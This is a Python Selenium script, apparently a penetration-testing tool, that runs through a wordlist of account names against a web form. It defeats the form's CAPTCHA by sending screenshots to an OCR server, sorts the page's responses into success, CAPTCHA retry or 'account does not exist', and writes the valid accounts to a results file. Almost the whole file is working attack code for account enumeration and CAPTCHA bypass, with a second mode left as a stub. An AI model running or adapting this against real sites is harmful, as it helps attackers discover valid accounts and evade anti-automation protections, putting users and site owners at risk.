from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import json
import func
import setting

mode = ''
url = ''
input_xpath = ''
input_wordlist = ''
captcha_img_xpath = ''
captcha_input_xpath = ''
enter_xpath = ''

def checkocr():
  with open("default.json", mode='r', encoding='UTF-8') as f:
    default = json.load(f)

  op = webdriver.ChromeOptions()
  op.page_load_strategy = 'normal'
  chrome = webdriver.Chrome(options=op)
  chrome.set_page_load_timeout(3)
  host = "http://" + default["ocr_url"]["ip"] + ":" + default["ocr_url"]["port"] + "/ping"
  location = "/html/body"

  try:
    chrome.get(host)
  except:
    print("domain not exist")
    return False

  else:
    result = chrome.find_element(By.XPATH, location)

    if(result.text == "pong"):
      return True

    else:
      return False

def attack(mode, url, input_xpath, testvalue, captcha_img_xpath, captcha_input_xpath, enter_xpath, success_box_xpath, retry_box_path, success_flag, retry_flag):
  
  with open("default.json", mode='r', encoding='UTF-8') as f:
    default = json.load(f)
    host = "http://" + default["ocr_url"]["ip"] + ":" + default["ocr_url"]["port"]
  
  op = webdriver.ChromeOptions()
  op.page_load_strategy = 'normal'
  chrome = webdriver.Chrome(options=op)
  chrome.get(url)

  if(mode == 1):
    imgs = chrome.find_element(By.XPATH, captcha_img_xpath)
    b64 = imgs.screenshot_as_base64
    
    account = chrome.find_element(By.XPATH, input_xpath)
    captcha = chrome.find_element(By.XPATH, captcha_input_xpath)
    submit = chrome.find_element(By.XPATH, enter_xpath)

    account.send_keys(testvalue)
    captcha.send_keys(func.ocr(b64, host))
    submit.click()

    #抓取測試結果
    retry_position = chrome.find_element(By.XPATH, retry_box_path)
    retry_msg = retry_position.text
    if(retry_msg == retry_flag):
      return "R"

    success_position = chrome.find_element(By.XPATH, success_box_xpath)
    success_msg = success_position.text

    if(success_msg == success_flag):
      return "S"
    
    return "F"

  elif(mode == 2):
    print("TODO")
#checkocr()
if(checkocr()):
  mode = setting.mode_set()
  if(mode == 1):

    result = ""
    url, input_xpath, input_wordlist, captcha_img_xpath, captcha_input_xpath, enter_xpath, success_box_xpath, retry_box_path, success_flag, retry_flag = setting.set(mode)
    with open(input_wordlist, mode='r', encoding='UTF-8') as doc:
      testvalue = doc.readline().strip('\n')
      while testvalue is not None and testvalue != '':
        result_flag = attack(mode, url, input_xpath, testvalue, captcha_img_xpath, captcha_input_xpath, enter_xpath, success_box_xpath, retry_box_path, success_flag, retry_flag)
        print("測試值:" + testvalue)
        print("測試結果:" + result_flag)
        if(result_flag == "S"):
          result += (testvalue + "\n")
          print("測試成功，儲存結果！\n")
          testvalue = doc.readline().strip('\n')

        elif(result_flag == "R"):
          print("驗證碼錯誤，重新測試！\n")

        else:
          print("帳號不存在，測試下一筆！\n")
          testvalue = doc.readline().strip('\n')
    
    print("***RESULT***")
    print(result)
    with open("result.txt", mode='w', encoding='UTF-8') as output:
      output.write(result)

  elif(mode == 2):
    print("TODO")

else:
  print("找不到 OCR 位置，請確認 default.json 的設定！")
